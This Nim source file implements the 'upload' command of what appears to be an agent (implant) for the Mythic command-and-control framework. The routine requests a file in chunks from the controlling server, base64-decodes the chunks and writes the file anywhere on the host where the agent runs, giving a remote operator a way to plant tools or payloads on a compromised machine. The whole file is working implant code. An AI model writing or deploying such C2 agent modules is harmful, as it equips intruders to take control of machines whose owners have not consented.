import std/[os, json, base64, strutils]
import ../types
import ./registry

proc uploadExecute(taskId: string, params: JsonNode, state: AgentState,
                   send: SendMsg): TaskResult =
  let remotePath = params{"remote_path"}.getStr("").strip()
  let fileId     = params{"file_id"}.getStr("").strip()

  if remotePath.len == 0:
    return TaskResult(output: "Error: remote_path required",
                      status: "error", completed: true)
  if fileId.len == 0:
    return TaskResult(output: "Error: file_id required",
                      status: "error", completed: true)

  let fullPath = if isAbsolute(remotePath): remotePath else: state.cwd / remotePath

  try:
    var fileData    = ""
    var totalChunks = 1
    var chunkNum    = 1

    while true:
      let msg = %*{
        "action": "post_response",
        "responses": [%*{
          "task_id":   taskId,
          "upload": {
            "chunk_num": chunkNum,
            "file_id":   fileId,
            "full_path": fullPath,
          },
        }],
      }
      let resp = send(msg)
      if resp.kind == JNull:
        return TaskResult(
          output: "Upload failed at chunk " & $chunkNum,
          status: "error", completed: true)

      let responses = resp{"responses"}
      if responses.isNil or responses.kind != JArray or responses.len == 0:
        return TaskResult(
          output: "Invalid Mythic response at chunk " & $chunkNum,
          status: "error", completed: true)

      let chunkResp = responses[0]
      if chunkNum == 1:
        totalChunks = chunkResp{"total_chunks"}.getInt(1)

      let chunkData = chunkResp{"chunk_data"}.getStr("")
      if chunkData.len > 0:
        fileData.add(decode(chunkData))

      if chunkNum >= totalChunks:
        break
      inc chunkNum

    writeFile(fullPath, fileData)
    return TaskResult(
      output: "Uploaded to " & fullPath & " (" & $fileData.len & " bytes)",
      status: "success",
      completed: true,
    )
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initUpload*() =
  register("upload", uploadExecute)
